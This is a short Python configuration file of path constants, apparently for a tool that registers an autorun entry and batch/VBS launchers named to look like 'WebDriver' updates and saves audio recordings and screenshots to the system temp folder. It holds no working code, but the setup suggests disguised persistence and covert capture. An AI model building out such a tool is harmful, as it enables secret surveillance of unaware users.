import os
import tempfile

BASE_DIR = os.path.dirname(os.path.realpath(__file__))
PC_TEMP_DIR = tempfile.gettempdir()
PROJECT_TEMP_DIR = os.path.join(BASE_DIR, "temp")

PYTHON_VENV_PATH = os.path.join("venv", "Scripts", "python.exe")

AUTORUN_NAME = "WebDrive"
BAT_FILENAME = "webDriver.bat"
RUN_FILENAME = "webDriverUpdates.vbs"

RECORD_PATH = os.path.join(PC_TEMP_DIR, "sound.wav")
SCREENSHOT_PATH = os.path.join(PC_TEMP_DIR, "screenshot.jpg")
